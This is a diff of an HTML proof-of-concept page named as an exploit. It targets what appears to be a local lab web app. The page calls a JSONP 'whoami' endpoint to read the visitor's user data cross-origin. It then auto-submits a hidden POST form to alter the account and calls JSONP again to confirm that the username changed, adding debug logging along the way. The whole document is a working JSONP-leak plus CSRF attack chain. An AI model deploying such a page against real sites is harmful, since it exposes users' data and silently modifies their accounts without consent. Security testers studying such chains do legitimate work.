@@ -11,25 +11,36 @@
 
   <script>
     function exploit(data) {
-      // Функция вызовется с данными пользователя
-      console.log("User data:", data);
+      console.log("[EXPLOIT] User data BEFORE:", data);
+      document.body.innerHTML += '<h1 style="color:red;">EXPLOIT STARTED</h1>';
+      document.body.innerHTML += '<p>Username before: ' + data.username + '</p>';
 
-      // Шаг 1: Переход на #/sheets
+      console.log("[EXPLOIT] Step 1: Navigate to #/sheets");
       window.location.hash = '#/sheets';
 
       setTimeout(() => {
-        // Шаг 2: POST запрос
+        console.log("[EXPLOIT] Step 2: Submitting POST form");
         document.getElementById('postForm').submit();
+        document.body.innerHTML += '<h2>POST SUBMITTED</h2>';
 
         setTimeout(() => {
-          // Шаг 3: Переход на #/settings
-          window.location.hash = '#/settings';
+          window.checkResult = function(updatedData) {
+            console.log("[EXPLOIT] User data AFTER:", updatedData);
+            document.body.innerHTML += '<h2 style="color:green;">Username after: ' + updatedData.username + '</h2>';
+
+            console.log("[EXPLOIT] Step 4: Navigate to #/settings");
+            window.location.hash = '#/settings';
+            document.body.innerHTML += '<h2>NAVIGATED TO SETTINGS</h2>';
+          };
+
+          const script = document.createElement('script');
+          script.src = 'http://localhost:8000/api/whoami/jsonp?callback=checkResult';
+          document.body.appendChild(script);
         }, 1000);
       }, 1000);
     }
   </script>
 
-  <!-- JSONP запрос, который вызовет функцию exploit -->
   <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
 </body>
 </html>
